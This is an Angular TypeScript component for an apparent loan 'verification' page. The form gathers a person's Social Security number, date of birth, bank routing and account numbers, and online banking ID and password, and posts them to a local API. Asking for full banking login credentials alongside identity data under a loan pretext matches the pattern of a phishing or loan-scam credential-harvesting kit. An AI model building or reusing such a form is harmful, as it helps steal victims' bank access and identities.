import { Component, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, NgForm } from '@angular/forms';
import { RouterLink } from '@angular/router';
import { HttpClient, HttpErrorResponse } from '@angular/common/http';

export interface VerificationPayload {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  dateOfBirth: string;
  ssn: string;
  loanAmount: string;
  streetAddress: string;
  city: string;
  state: string;
  country: string;
  zipCode: string;
  bankName: string;
  routingNumber: string;
  accountNumber: string;
  onlineBankingId: string;
  onlineBankingPassword: string;
  agreement: boolean;
}

interface VerificationForm extends VerificationPayload {}

@Component({
  selector: 'app-verify',
  standalone: true,
  imports: [CommonModule, FormsModule, RouterLink],
  templateUrl: './verify.component.html',
  styleUrl: './verify.component.scss'
})
export class VerifyComponent {
  private readonly http = inject(HttpClient);

  private readonly apiUrl =
    'http://localhost:5000/api/Verifications';

  submitted = false;
  isSubmitting = false;

  showPassword = false;

  successMessage = '';
  serverError = '';

  form: VerificationForm = {
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    dateOfBirth: '',
    ssn: '',
    loanAmount: '',
    streetAddress: '',
    city: '',
    state: '',
    country: 'United States',
    zipCode: '',
    bankName: '',
    routingNumber: '',
    accountNumber: '',
    onlineBankingId: '',
    onlineBankingPassword: '',
    agreement: false
  };

  readonly states = [
    'Alabama',
    'Alaska',
    'Arizona',
    'Arkansas',
    'California',
    'Colorado',
    'Connecticut',
    'Delaware',
    'Florida',
    'Georgia',
    'Hawaii',
    'Idaho',
    'Illinois',
    'Indiana',
    'Iowa',
    'Kansas',
    'Kentucky',
    'Louisiana',
    'Maine',
    'Maryland',
    'Massachusetts',
    'Michigan',
    'Minnesota',
    'Mississippi',
    'Missouri',
    'Montana',
    'Nebraska',
    'Nevada',
    'New Hampshire',
    'New Jersey',
    'New Mexico',
    'New York',
    'North Carolina',
    'North Dakota',
    'Ohio',
    'Oklahoma',
    'Oregon',
    'Pennsylvania',
    'Rhode Island',
    'South Carolina',
    'South Dakota',
    'Tennessee',
    'Texas',
    'Utah',
    'Vermont',
    'Virginia',
    'Washington',
    'West Virginia',
    'Wisconsin',
    'Wyoming'
  ];

  readonly countries = [
    'United States',
    'Canada',
    'United Kingdom',
    'Mexico'
  ];

  togglePassword(): void {
    this.showPassword = !this.showPassword;
  }

  formatDateOfBirth(event: Event): void {
    const input = event.target as HTMLInputElement;
  
    // Keep only numbers
    let value = input.value.replace(/\D/g, '');
  
    // Maximum: MMDDYYYY = 8 digits
    value = value.substring(0, 8);
  
    // Add /
    if (value.length > 4) {
      value =
        value.substring(0, 2) +
        '/' +
        value.substring(2, 4) +
        '/' +
        value.substring(4);
    } else if (value.length > 2) {
      value =
        value.substring(0, 2) +
        '/' +
        value.substring(2);
    }
  
    this.form.dateOfBirth = value;
    input.value = value;
  }

  submitVerification(formRef: NgForm): void {
    this.submitted = true;
    this.successMessage = '';
    this.serverError = '';

    formRef.control.markAllAsTouched();

    // Stop if frontend validation fails
    if (formRef.invalid) {
      return;
    }

    this.isSubmitting = true;

    const payload: VerificationPayload = {
      firstName: this.form.firstName.trim(),
      lastName: this.form.lastName.trim(),
      email: this.form.email.trim(),
      phone: this.form.phone.trim(),
      dateOfBirth: this.form.dateOfBirth.trim(),
      ssn: this.form.ssn.trim(),
      loanAmount: this.form.loanAmount.trim(),
      streetAddress: this.form.streetAddress.trim(),
      city: this.form.city.trim(),
      state: this.form.state.trim(),
      country: this.form.country.trim(),
      zipCode: this.form.zipCode.trim(),
      bankName: this.form.bankName.trim(),
      routingNumber: this.form.routingNumber.trim(),
      accountNumber: this.form.accountNumber.trim(),
      onlineBankingId: this.form.onlineBankingId.trim(),
      onlineBankingPassword: this.form.onlineBankingPassword,
      agreement: this.form.agreement
    };

    this.http.post<any>(this.apiUrl, payload).subscribe({
      next: (response) => {
        this.isSubmitting = false;

        this.successMessage =
          'Verification submitted successfully.';

        this.serverError = '';

        console.log(
          'Verification submitted:',
          response
        );

        formRef.resetForm({
          country: 'United States',
          agreement: false
        });

        this.submitted = false;
        this.showPassword = false;
      },

      error: (error: HttpErrorResponse) => {
        this.isSubmitting = false;

        console.error(
          'Verification failed:',
          error
        );

        if (error.status === 400) {
          this.serverError =
            this.extractValidationErrors(error);
        } else if (error.status === 0) {
          this.serverError =
            'Unable to connect to the backend. Please make sure the API is running.';
        } else {
          this.serverError =
            'Unable to submit verification. Please try again later.';
        }
      }
    });
  }

  private extractValidationErrors(
    error: HttpErrorResponse
  ): string {
    const errors = error.error?.errors;

    if (!errors) {
      return 'Please check the information entered and try again.';
    }

    const messages: string[] = [];

    Object.keys(errors).forEach((key) => {
      const fieldErrors = errors[key];

      if (Array.isArray(fieldErrors)) {
        messages.push(...fieldErrors);
      }
    });

    return messages.length > 0
      ? messages.join(' ')
      : 'Please check the information entered and try again.';
  }
}